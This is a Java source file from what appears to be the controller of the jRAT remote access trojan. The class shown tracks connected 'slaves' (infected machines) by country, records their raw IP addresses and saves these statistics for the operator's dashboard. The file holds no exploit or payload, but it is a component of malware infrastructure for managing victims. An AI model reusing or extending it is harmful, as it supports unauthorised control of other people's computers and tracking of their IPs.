package jrat.controller.settings;

import graphslib.graph.GraphEntry;
import jrat.common.Logger;
import jrat.controller.AbstractSlave;
import jrat.controller.Globals;
import jrat.controller.Main;
import jrat.controller.utils.FlagUtils;

import java.io.*;
import java.util.ArrayList;
import java.util.List;

public class StatisticsCountry extends AbstractStorable implements Serializable {

	private static final long serialVersionUID = -7692558803046215384L;

	private static final StatisticsCountry instance = new StatisticsCountry();

	private transient List<CountryStatEntry> list = new ArrayList<>();

	public static StatisticsCountry getGlobal() {
		return instance;
	}

	public static boolean isTracking() {
		return Settings.getGlobal().getBoolean(Settings.KEY_TRACK_STATISTICS);
	}

	public List<CountryStatEntry> getList() {
		return list;
	}

	public CountryStatEntry getEntry(String country, String longcountry) {
		if (country.equals("?")) {
			country = "unknown";
		}

		for (int i = 0; i < list.size(); i++) {
			CountryStatEntry entry = list.get(i);
			if (entry.country.equalsIgnoreCase(country)) {
				return entry;
			}
		}

		CountryStatEntry stat = new CountryStatEntry();
		stat.country = country;
		stat.longcountry = longcountry;

		list.add(stat);
		Logger.log("Added: " + country);
		return stat;
	}

	@Override
	@SuppressWarnings("unchecked")
	public void load() throws Exception {
		if (!isTracking()) {
			return;
		}

		ObjectInputStream str = new ObjectInputStream(new FileInputStream(getFile()));
		list = (ArrayList<CountryStatEntry>) str.readObject();
		str.close();
		reload();
	}

	public void save() throws Exception {
		if (!isTracking()) {
			return;
		}

		ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(getFile()));
		str.writeObject(list);
		str.close();
	}

	public void add(AbstractSlave abstractSlave) {
		if (!isTracking()) {
			return;
		}

		CountryStatEntry entry = getEntry(abstractSlave.getCountry(), abstractSlave.getCountry());

		entry.connects++;
		boolean exists = false;
		for (String str : entry.list) {
			if (str.equals(abstractSlave.getRawIP())) {
				exists = true;
			}
		}
		if (!exists) {
			entry.list.add(0, abstractSlave.getRawIP());
		}
		reload();
	}

	public void reload() {
		if (Main.instance != null) {
			Main.instance.getPanelStats().countryGraph.clear();

			for (int i = 0; i < list.size(); i++) {
				CountryStatEntry entry = list.get(i);
				try {

					if (entry != null) {
						GraphEntry total = new GraphEntry(entry.getCountry(), entry.getConnects(), FlagUtils.getFlag(entry.getCountry()));

						Main.instance.getPanelStats().countryGraph.add(total);
						Main.instance.getPanelStats().repaint();
					}

				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	public int getNoConnects() {
		int no = 0;
		for (CountryStatEntry e : list) {
			no += e.connects;
		}
		return no;
	}

	public int getDifferentConnects() {
		int no = 0;
		for (CountryStatEntry e : list) {
			no += e.list.size();
		}
		return no;
	}

	public class CountryStatEntry implements Serializable {

		private static final long serialVersionUID = 8462429809223243541L;

		private String country = "Unknown";
		private String longcountry = "Unknown";
		private Integer connects = 0;
		private List<String> list = new ArrayList<>();

		public String getCountry() {
			return country;
		}

		public void setCountry(String country) {
			this.country = country;
		}

		public String getLongCountry() {
			return longcountry;
		}

		public void setLongCountry(String longcountry) {
			this.longcountry = longcountry;
		}

		public int getConnects() {
			return connects;
		}

		public void setConnects(int connects) {
			this.connects = connects;
		}

		public List<String> getList() {
			return list;
		}

		public void setList(List<String> list) {
			this.list = list;
		}

	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".countrystats");
	}

}
